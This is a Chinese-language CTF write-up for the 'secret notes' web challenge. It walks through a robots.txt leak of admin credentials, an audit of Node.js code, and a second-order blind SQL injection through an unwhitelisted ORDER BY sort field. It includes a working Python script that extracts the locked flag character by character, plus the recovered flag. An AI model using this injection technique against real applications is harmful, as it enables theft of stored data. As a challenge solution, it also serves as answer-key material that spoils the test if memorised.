# 秘密便签

dirsearch 扫出 robots.txt

```
User-agent: *
Disallow: /archive/deploy-notes.txt
```

访问得到账户密码

```
秘密便签 / 部署交接记录
更新时间: 2026-10-15T11:13:02Z
登录账号: admin
临时登录密码: 019c8326ec8d1ffce65c5ec405cdefcd
登录密码与便签锁口令分别管理。
归档仅供部署交接，搜索引擎请勿收录。
```

成功登陆进网页

存在私密记录，被口令锁住了不让看

可以新建便签

可以选择排序偏好来给主界面展示的便签排序

题目给了源码，开始审计

```dockerfile
# 开发环境用于本地测试，线上部署为生产环境
ENV NODE_ENV=development
```

线下为开发环境，线上为生产环境，如果在本地 docker 构建来测试的话密码固定为 `local-dev-password` ，flag 固定为 `flag{fake_for_local_test}`  ，方便本地测试

```js
const DEV_ADMIN_PASSWORD = 'local-dev-password';

function initialize(db, flag) {
  const adminPassword = process.env.ADMIN_PASSWORD
    || (process.env.NODE_ENV === 'production' ? null : DEV_ADMIN_PASSWORD);
```

```javascript
const flag = process.env.FLAG
  ?? (process.env.NODE_ENV === 'production' ? null : 'flag{fake_for_local_test}');
```

发现 flag 被锁在私密便签中，密码是随机生成后哈希的，打密码这条路不可取

```javascript
const lockHash = hashPassword(crypto.randomBytes(16).toString('hex'));
```

不过 flag 明文存储在 `notes` 表中，对应为 `notes.body`

```javascript
const secretNote = db.prepare('SELECT id FROM notes WHERE owner_id = ? AND system_note = ?').get(1, 1);
if (secretNote) {
  db.prepare('UPDATE notes SET body = ?, locked = ?, lock_hash = ? WHERE id = ?')
    .run(flag, 1, lockHash, secretNote.id);
} else {
  db.prepare(`INSERT INTO notes (owner_id, title, body, priority, locked, lock_hash, system_note, created_at)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?)`)
    .run(1, '私密记录', flag, 2, 1, lockHash, 1, '2026-10-06T14:48:00.000Z');
}
```

注意到 `/notes` 路由的 `sort_field` 和 `sort_dir` 没做参数化， `sort_field` 和 `sort_dir` 来自 `users` 表，不过 `ORDER BY` 的列名或表达式本来就不能参数化，因为占位符只能绑值，不能绑标识符。这里采用了字符串拼接，关键是拼接的字段或表达式必须经过白名单限制，不能直接使用用户输入

```javascript
router.get('/notes', requireLogin, (req, res) => {
  const { sort_field, sort_dir } = db.prepare('SELECT sort_field, sort_dir FROM users WHERE id = ?').get(req.currentUser.id);
  let list;
  try {
    list = db.prepare(
      `SELECT id, title, priority, locked, created_at
       FROM notes
       WHERE owner_id = ?
       ORDER BY ${sort_field} ${sort_dir}, id ASC`
    ).all(req.currentUser.id);
  } catch {
    if (wantsJson(req)) return res.status(400).json({ error: '排序偏好暂时不可用，请重新设置。' });
    return res.page('error', { title: '无法排列便签', nav: 'notes', code: 400, message: '排序偏好暂时不可用，请到排序设置中重新保存。', settingsLink: true }, 400);
  }
  if (wantsJson(req)) return res.json({ notes: list });
  res.page('notes', { title: '我的便签', nav: 'notes', notes: list, feedback: takeNotice(req) });
});
```

不过继续追踪 `sort_field` 和 `sort_dir` 的来源，发现 `dir` 做了白名单，只能为 `asc` 或 `desc` ，但 `field` 没做白名单，直接拿了请求 `req.body.sort_field.trim()` 的值，然后查了一下非空、校验了一下 `SORT_FIELD_MAX` 就没了

```javascript
router.post('/settings', requireLogin, (req, res) => {
  const field = typeof req.body.sort_field === 'string' ? req.body.sort_field.trim() : '';
  const dir = req.body.sort_dir === 'asc' ? 'asc' : 'desc';
  if (!field || field.length > SORT_FIELD_MAX) {
    return res.page('settings', { title: '排序偏好', nav: 'settings', sortField: 'created_at', sortDir: 'desc', feedback: feedback('请选择排序方式。') }, 400);
  }
  db.prepare('UPDATE users SET sort_field = ?, sort_dir = ? WHERE id = ?').run(field, dir, req.currentUser.id);
  req.session.notice = '排序偏好已保存。';
  res.redirect(303, '/settings');
});
```

因此这里存在二次注入，先污染 `users` 表，再注入进 `/notes` 路由影响排序顺序，根据逐字符比对并观察首页的顺序来爆破出以明文存储的 flag

具体思路就是创建两个参考便签，先创建的为 a!@# ，id 较小，后创建的为 b!@# ，id 较大，然后我们可以注入，使得 SQL 语句类似为：

```sql
ORDER BY CASE WHEN ((SELECT unicode(substr(body,i,1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > j) THEN id ELSE -id END ASC, id ASC
```

这样控制 j 可以二分查找爆出 i 的字符为多少，然后一步步爆破出全部内容

**exp.py**

```python
import requests

base = "https://edi4cx2o5onw.challenge.jlu-terminal.site"

s = requests.Session()

s.cookies.set("secret_notes.sid","s%3AkR4ogR85p4Tf86RQseSLtKcqYqHVQp2K.i3Vg6MSPTZAiFRB4xvqY3D9kLb3Slq9zKUUUL2Y6nFg")

def oracle(pos, mid):
    r1 = s.post(f"{base}/settings",
                data={
                    "sort_field":f"CASE WHEN ((SELECT unicode(substr(body,{pos},1)) FROM notes WHERE owner_id = 1 AND locked = 1 LIMIT 1) > {mid}) THEN id ELSE -id END",
                    "sort_dir":"asc"
                }
                )
    r2 = s.get(f"{base}/notes")

    return r2.text.find("a!@#")<r2.text.find("b!@#")


flag = ""

for pos in range(1,101):
    left, right = 0, 127

    while(left < right):
        mid = (left + right) // 2
        if oracle(pos, mid):
            left = mid + 1
        else:
            right = mid

    if left == 0:
        break

    flag += chr(left)
    print(flag)

print()
print("Flag:", flag)
```

```
S
Sp
Spi
Spir
Spiri
Spirit
SpiritC
SpiritCT
SpiritCTF
SpiritCTF{
SpiritCTF{0
SpiritCTF{0R
SpiritCTF{0Rd
SpiritCTF{0Rde
SpiritCTF{0RdeR
SpiritCTF{0RdeR_
SpiritCTF{0RdeR_B
SpiritCTF{0RdeR_By
SpiritCTF{0RdeR_By-
SpiritCTF{0RdeR_By-b
SpiritCTF{0RdeR_By-bL
SpiritCTF{0RdeR_By-bLl
SpiritCTF{0RdeR_By-bLln
SpiritCTF{0RdeR_By-bLlnD
SpiritCTF{0RdeR_By-bLlnD-
SpiritCTF{0RdeR_By-bLlnD-S
SpiritCTF{0RdeR_By-bLlnD-Sq
SpiritCTF{0RdeR_By-bLlnD-SqI
SpiritCTF{0RdeR_By-bLlnD-SqIi
SpiritCTF{0RdeR_By-bLlnD-SqIi6
SpiritCTF{0RdeR_By-bLlnD-SqIi6d
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77
SpiritCTF{0RdeR_By-bLlnD-SqIi6d775
SpiritCTF{0RdeR_By-bLlnD-SqIi6d7755
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559a
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af
SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}

Flag: SpiritCTF{0RdeR_By-bLlnD-SqIi6d77559af}
```
